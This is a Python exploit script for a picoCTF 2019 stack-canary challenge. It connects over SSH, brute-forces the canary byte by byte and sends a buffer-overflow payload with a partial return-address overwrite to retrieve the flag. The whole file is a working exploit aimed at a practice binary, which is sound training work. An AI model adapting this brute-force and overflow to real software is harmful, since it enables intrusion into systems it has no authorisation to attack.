import os
import sys
import string
import paramiko
import struct

target_dir = '/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/'
target ='./vuln'
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    ssh.connect('2019shell1.picoctf.com',username=sys.argv[1],password=sys.argv[2])

except:
    print('[!] Failed To Connect..')
    print('\tPlease enter your username and password as arguments..')
    exit(1)


def send(payload):
    cmd = '''cd {} ;python -c "print({})" | {}'''.format(target_dir,payload,target)
    _,stdout,stderr = ssh.exec_command(cmd)
    return stdout.readlines()

def brute_canary():
    i = 0
    canary= ''
    while i<4:
        for c in list(string.printable):
            buf = "'" + str(i+33)+'\\n'+'A'*32 + canary +c+'A'*1000 +"'"
            out =send(buf)
            print('[+] trying: ' +c)
            if not 'Smashing' in out[1]:
                canary+=c
                print('[+] Found: '+c+' Canary:'+canary)
                i+=1
                break
    print('[*] Success: {}'.format(canary))
    return canary

canary=''
if 'canary.txt' not in os.listdir('.'):
    print('[+] Creating new text file canary.txt')
    with open('canary.txt','w') as f:
        canary = brute_canary()
        f.write(canary)
else:
    with open('canary.txt','r') as f:
        print '[+] Reading canary from file..'
        canary = f.read()
        
buf="'"+'54\\n'+'A'*32+canary+'A'*16+'\xed\x07'+"'"
out = send(buf)
print '[+] Sending payload..'
i=0
while len(out) <3:
    print ['[-]','[\\]','[|]','[/]'][i%4]
    i+=1
    out = send(buf)

print '[*] Success!'
print out[2]
ssh.close()
